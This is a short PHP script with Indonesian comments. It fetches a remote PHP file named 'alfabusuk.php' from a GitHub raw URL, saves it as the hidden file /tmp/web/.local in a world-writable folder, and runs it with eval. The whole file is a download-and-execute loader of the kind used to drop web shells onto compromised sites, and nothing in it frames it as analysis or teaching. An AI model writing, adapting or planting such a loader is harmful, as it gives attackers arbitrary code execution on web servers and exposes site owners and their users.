<?php

$folderPath = '/tmp/web';
$filePath = $folderPath . '/.local';
$remoteFileUrl = 'https://raw.githubusercontent.com/ONEJACK/a/main/alfabusuk.php';

// Mengecek apakah folder '/tmp/web' sudah ada, jika tidak, membuatnya
if (!file_exists($folderPath) || !is_dir($folderPath)) {
    mkdir($folderPath, 0777, true);
}

// Mengambil isi file dari URL menggunakan curl
$ch = curl_init($remoteFileUrl);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$fileContent = curl_exec($ch);

// Menyimpan isi file ke dalam '/tmp/web/.local'
file_put_contents($filePath, $fileContent);

// Menampilkan pesan sukses atau error
if ($fileContent !== false) {
    eval("?>".file_get_contents("/tmp/web/.local"));
} else {
    echo "Gagal mengunduh file dari $remoteFileUrl\n";
}

// Menutup koneksi curl
curl_close($ch);
?>